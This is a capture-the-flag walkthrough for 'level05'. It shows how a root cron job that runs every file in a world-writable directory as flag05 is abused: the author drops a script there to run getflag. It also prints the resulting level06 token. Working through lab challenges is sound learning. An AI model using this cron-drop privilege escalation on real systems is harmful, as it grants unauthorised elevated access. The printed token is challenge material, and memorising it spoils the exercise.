# level05

## Goal
Get `getflag` to run as `flag05` via a scheduled job.

## Recon
The home directory has nothing useful, but there is mail:

```sh
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Every 2 minutes, root runs `/usr/sbin/openarenaserver` **as flag05**. We cannot read
that script directly (`-rwxr-x--- flag05`), but we can see what it does once we look
(it is also world-readable via `/rofs`, or inferred):

```sh
$ cat /usr/sbin/openarenaserver
#!/bin/sh
for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

It executes **every file** in `/opt/openarenaserver/` with `bash` (as flag05) and then
deletes it. And that directory is writable by us (ACL grants `level05` rwx):

```sh
$ getfacl /opt/openarenaserver
user:level05:rwx
```

## Exploit
Drop a script that runs `getflag` and saves the output somewhere we can read it:

```sh
$ cat > /opt/openarenaserver/x.sh <<'EOF'
getflag > /tmp/l5_token 2>&1
chmod 666 /tmp/l5_token
EOF
```

Wait for the next 2-minute tick, then read the token:

```sh
$ cat /tmp/l5_token
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## Result
- **level06 password (token):** `viuaaale9huek52boumoomioc`
